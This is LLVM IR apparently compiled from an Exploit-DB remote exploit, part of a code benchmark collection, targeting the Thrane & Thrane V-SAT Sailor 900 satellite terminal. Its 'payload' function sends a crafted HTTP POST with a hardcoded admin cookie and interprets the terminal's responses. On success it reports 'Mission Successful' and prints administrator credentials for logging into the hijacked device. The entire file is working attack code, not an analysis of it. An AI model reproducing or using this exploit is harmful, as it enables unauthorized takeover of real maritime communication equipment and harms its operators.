; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_35932.c_payload.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_35932.c_payload.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFFER_MAX_SIZE = common dso_local global i32 0, align 4
@BUFFER_MIN_LEN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [129 x i8] c"POST %s HTTP/1.0\0A\0AHost: %s\0D\0AContent-type: application/x-www-form-urlencoded\0D\0AContent-length: %zu \0D\0ACookie: tt_adm=694020\0D\0A%s \0D\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"Read error\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.3 = private unnamed_addr constant [22 x i8] c"Sending Payload.....\0A\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"404\00", align 1
@.str.7 = private unnamed_addr constant [121 x i8] c"\0A\0A[x] Exploit Failed Ref. RFC 2616, 10.4.5 - False Positive HTTP ERROR [404] Host is not a V-SAT Sailor 900 terminal.\0A\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"401\00", align 1
@.str.9 = private unnamed_addr constant [108 x i8] c"\0A\0A[x] Exploit Failed Ref. RFC 2616, 10.4.2 - HTTP Unauthorized [401] Unauthorized Access to remote host.\0A\0A\0A\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"500\00", align 1
@.str.11 = private unnamed_addr constant [194 x i8] c"\0A\0A[x] Exploit Failed Ref. RFC 2616, 10.5.1 - HTTP Internal Server Error [500] Internal Server Error - The remote host couldn't recognise the request. This is not a valid SAILOR 900 terminal.\0A\0A\0A\00", align 1
@.str.12 = private unnamed_addr constant [4 x i8] c"303\00", align 1
@.str.13 = private unnamed_addr constant [192 x i8] c"\0A\0A[x] Exploit Failed Ref. RFC 2616, 10.3.4 - HTTP See Other [303] Possible Redirect - The code received says it is temporary under a different URL. This is not a valid SAILOR 900 terminal.\0A\0A\0A\00", align 1
@.str.14 = private unnamed_addr constant [4 x i8] c"307\00", align 1
@.str.15 = private unnamed_addr constant [194 x i8] c"\0A\0A[x] Exploit Failed Ref. RFC 2616, 10.3.8 - HTTP Temporary Redirect [307] Possible Redirect - The requested resource received indicates redirection. This is not a valid SAILOR 900 terminal.\0A\0A\0A\00", align 1
@.str.16 = private unnamed_addr constant [4 x i8] c"403\00", align 1
@.str.17 = private unnamed_addr constant [143 x i8] c"\0A\0A[x] Exploit Failed Ref. RFC 2616, 10.4.4 - HTTP Forbidden [403] The remote server/ understood the request, but is refusing to fulfill it.\0A\0A\0A\00", align 1
@.str.18 = private unnamed_addr constant [4 x i8] c"407\00", align 1
@.str.19 = private unnamed_addr constant [223 x i8] c"\0A\0A[x] Exploit Failed Ref. RFC 2616, 10.4.8 - HTTP Proxy Authentication Required [407] - The remote terminal requires HTTP authentication. If this is a valid SAILOR 900 terminal, it is protected with HTTP authentication.\0A\0A\0A\00", align 1
@.str.20 = private unnamed_addr constant [4 x i8] c"408\00", align 1
@.str.21 = private unnamed_addr constant [169 x i8] c"\0A\0A[x] Exploit Failed Ref. RFC 2616, 10.4.9 - HTTP Request Time out [408] - The client did not produce a request within the time that the server was prepared to wait.\0A\0A\0A\00", align 1
@.str.22 = private unnamed_addr constant [4 x i8] c"503\00", align 1
@.str.23 = private unnamed_addr constant [182 x i8] c"\0A\0A[x] Exploit Failed Ref. RFC 2616, 10.5.4 - HTTP Service Unavailable [503] - Connection Refused. The hostname of the terminal provided is currently unable to handle the request.\0A\0A\0A\00", align 1
@.str.24 = private unnamed_addr constant [4 x i8] c"411\00", align 1
@.str.25 = private unnamed_addr constant [110 x i8] c"\0A\0A[x] Exploit Failed Ref. RFC 2616 - Error 411 - Length Required. This is not a valid SAILOR 900 terminal.\0A\0A\0A\00", align 1
@.str.26 = private unnamed_addr constant [4 x i8] c"400\00", align 1
@.str.27 = private unnamed_addr constant [164 x i8] c"\0A\0A[x] Exploit Failed Ref. RFC 2616 - Error 400 - Bad Request. This is not a valid SAILOR 900 terminal. The request could not be understood by the remote server.\0A\0A\0A\00", align 1
@.str.28 = private unnamed_addr constant [4 x i8] c"301\00", align 1
@.str.29 = private unnamed_addr constant [170 x i8] c"\0A\0A[x] Exploit Failed Ref. RFC 2616 - Error 301 - Moved Permanently. This is not a valid SAILOR 900 terminal. The request could not be understood by the remote server.\0A\0A\0A\00", align 1
@.str.30 = private unnamed_addr constant [12 x i8] c"BAD REQUEST\00", align 1
@.str.31 = private unnamed_addr constant [66 x i8] c"\0A\0A[x] Exploit Failed. This is not a valid SAILOR 900 terminal.\0A\0A\0A\00", align 1
@.str.32 = private unnamed_addr constant [4 x i8] c"202\00", align 1
@.str.33 = private unnamed_addr constant [16 x i8] c"Thrane & Thrane\00", align 1
@.str.34 = private unnamed_addr constant [68 x i8] c"\0A\0A[x] Exploit Failed. This is not a valid SAILOR 900 terminal...\0A\0A\0A\00", align 1
@.str.35 = private unnamed_addr constant [4 x i8] c"302\00", align 1
@.str.36 = private unnamed_addr constant [175 x i8] c"[x] Mission Successful  Ref. RFC 2616, 10.2.3 - HTTP Okay  [202] The remote host is a V-SAT Sailor 900. Please Login as administrator: user:admin & pass:aisatpwn2134 on %s\0A\0A\0A\00", align 1
@.str.37 = private unnamed_addr constant [73 x i8] c"***********************************************************************\0A\00", align 1
@.str.38 = private unnamed_addr constant [73 x i8] c"*Advanced Information Security Corporation, 2014 - All Rights Reserved*\0A\00", align 1
@.str.39 = private unnamed_addr constant [70 x i8] c"* Please wait.. I will provide you with some more information below:\0A\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"\0A\0A\0A\0A\00", align 1
@.str.41 = private unnamed_addr constant [6 x i8] c"%s \0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @payload(i32 %0, i8* %1, i8* %2, i8* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i8* %2, i8** %8, align 8
  store i8* %3, i8** %9, align 8
  %16 = load i32, i32* @BUFFER_MAX_SIZE, align 4
  %17 = add nsw i32 %16, 1
  %18 = zext i32 %17 to i64
  %19 = call i8* @llvm.stacksave()
  store i8* %19, i8** %10, align 8
  %20 = alloca i8, i64 %18, align 16
  store i64 %18, i64* %11, align 8
  %21 = load i32, i32* @BUFFER_MAX_SIZE, align 4
  %22 = add nsw i32 %21, 1
  %23 = zext i32 %22 to i64
  %24 = alloca i8, i64 %23, align 16
  store i64 %23, i64* %12, align 8
  %25 = load i32, i32* @BUFFER_MIN_LEN, align 4
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %7, align 8
  %28 = load i8*, i8** %9, align 8
  %29 = call i8* @strlen(i8* %28)
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 @snprintf(i8* %20, i32 %25, i8* getelementptr inbounds ([129 x i8], [129 x i8]* @.str, i64 0, i64 0), i8* %26, i8* %27, i8* %29, i8* %30)
  %32 = load i32, i32* %6, align 4
  %33 = call i8* @strlen(i8* %20)
  %34 = call i32 @write(i32 %32, i8* %20, i8* %33)
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %38

36:                                               ; preds = %4
  %37 = call i32 @error(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %5, align 4
  store i32 1, i32* %15, align 4
  br label %151

38:                                               ; preds = %4
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0))
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i8* %20, i64 %18)
  br label %43

43:                                               ; preds = %141, %38
  %44 = load i32, i32* %6, align 4
  %45 = trunc i64 %23 to i32
  %46 = call i32 @read(i32 %44, i8* %24, i32 %45)
  store i32 %46, i32* %13, align 4
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %142

48:                                               ; preds = %43
  %49 = load i32, i32* %13, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %24, i64 %50
  store i8 0, i8* %51, align 1
  %52 = load i32, i32* %13, align 4
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %56

54:                                               ; preds = %48
  %55 = call i32 @error(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %5, align 4
  store i32 1, i32* %15, align 4
  br label %151

56:                                               ; preds = %48
  %57 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0))
  %58 = icmp ne i8* %57, null
  br i1 %58, label %59, label %61

59:                                               ; preds = %56
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.7, i64 0, i64 0))
  br label %61

61:                                               ; preds = %59, %56
  %62 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0))
  %63 = icmp ne i8* %62, null
  br i1 %63, label %64, label %66

64:                                               ; preds = %61
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([108 x i8], [108 x i8]* @.str.9, i64 0, i64 0))
  br label %66

66:                                               ; preds = %64, %61
  %67 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0))
  %68 = icmp ne i8* %67, null
  br i1 %68, label %69, label %71

69:                                               ; preds = %66
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([194 x i8], [194 x i8]* @.str.11, i64 0, i64 0))
  br label %71

71:                                               ; preds = %69, %66
  %72 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0))
  %73 = icmp ne i8* %72, null
  br i1 %73, label %74, label %76

74:                                               ; preds = %71
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([192 x i8], [192 x i8]* @.str.13, i64 0, i64 0))
  br label %76

76:                                               ; preds = %74, %71
  %77 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.14, i64 0, i64 0))
  %78 = icmp ne i8* %77, null
  br i1 %78, label %79, label %81

79:                                               ; preds = %76
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([194 x i8], [194 x i8]* @.str.15, i64 0, i64 0))
  br label %81

81:                                               ; preds = %79, %76
  %82 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i64 0, i64 0))
  %83 = icmp ne i8* %82, null
  br i1 %83, label %84, label %86

84:                                               ; preds = %81
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([143 x i8], [143 x i8]* @.str.17, i64 0, i64 0))
  br label %86

86:                                               ; preds = %84, %81
  %87 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.18, i64 0, i64 0))
  %88 = icmp ne i8* %87, null
  br i1 %88, label %89, label %91

89:                                               ; preds = %86
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([223 x i8], [223 x i8]* @.str.19, i64 0, i64 0))
  br label %91

91:                                               ; preds = %89, %86
  %92 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.20, i64 0, i64 0))
  %93 = icmp ne i8* %92, null
  br i1 %93, label %94, label %96

94:                                               ; preds = %91
  %95 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([169 x i8], [169 x i8]* @.str.21, i64 0, i64 0))
  br label %96

96:                                               ; preds = %94, %91
  %97 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.22, i64 0, i64 0))
  %98 = icmp ne i8* %97, null
  br i1 %98, label %99, label %101

99:                                               ; preds = %96
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.23, i64 0, i64 0))
  br label %101

101:                                              ; preds = %99, %96
  %102 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.24, i64 0, i64 0))
  %103 = icmp ne i8* %102, null
  br i1 %103, label %104, label %106

104:                                              ; preds = %101
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.25, i64 0, i64 0))
  br label %106

106:                                              ; preds = %104, %101
  %107 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.26, i64 0, i64 0))
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

109:                                              ; preds = %106
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str.27, i64 0, i64 0))
  br label %111

111:                                              ; preds = %109, %106
  %112 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.28, i64 0, i64 0))
  %113 = icmp ne i8* %112, null
  br i1 %113, label %114, label %116

114:                                              ; preds = %111
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([170 x i8], [170 x i8]* @.str.29, i64 0, i64 0))
  br label %116

116:                                              ; preds = %114, %111
  %117 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.30, i64 0, i64 0))
  %118 = icmp ne i8* %117, null
  br i1 %118, label %119, label %121

119:                                              ; preds = %116
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.31, i64 0, i64 0))
  br label %121

121:                                              ; preds = %119, %116
  %122 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.32, i64 0, i64 0))
  %123 = icmp ne i8* %122, null
  br i1 %123, label %124, label %131

124:                                              ; preds = %121
  br label %125

125:                                              ; preds = %128, %124
  %126 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.33, i64 0, i64 0))
  store i8* %126, i8** %14, align 8
  %127 = icmp eq i8* %126, null
  br i1 %127, label %128, label %130

128:                                              ; preds = %125
  %129 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.34, i64 0, i64 0))
  br label %125

130:                                              ; preds = %125
  br label %141

131:                                              ; preds = %121
  %132 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.33, i64 0, i64 0))
  %133 = icmp ne i8* %132, null
  br i1 %133, label %134, label %140

134:                                              ; preds = %131
  %135 = call i8* @strstr(i8* %24, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.35, i64 0, i64 0))
  %136 = icmp eq i8* %135, null
  br i1 %136, label %137, label %140

137:                                              ; preds = %134
  %138 = load i8*, i8** %7, align 8
  %139 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([175 x i8], [175 x i8]* @.str.36, i64 0, i64 0), i8* %138)
  br label %140

140:                                              ; preds = %137, %134, %131
  br label %141

141:                                              ; preds = %140, %130
  br label %43

142:                                              ; preds = %43
  %143 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.37, i64 0, i64 0))
  %144 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.38, i64 0, i64 0))
  %145 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.37, i64 0, i64 0))
  %146 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.39, i64 0, i64 0))
  %147 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.37, i64 0, i64 0))
  %148 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i64 0, i64 0))
  %149 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.41, i64 0, i64 0), i8* %24, i64 %23)
  %150 = load i32, i32* %13, align 4
  store i32 %150, i32* %5, align 4
  store i32 1, i32* %15, align 4
  br label %151

151:                                              ; preds = %142, %54, %36
  %152 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %152)
  %153 = load i32, i32* %5, align 4
  ret i32 %153
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, i8*, i8*, i8*) #2

declare dso_local i8* @strlen(i8*) #2

declare dso_local i32 @write(i32, i8*, i8*) #2

declare dso_local i32 @error(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i8* @strstr(i8*, i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
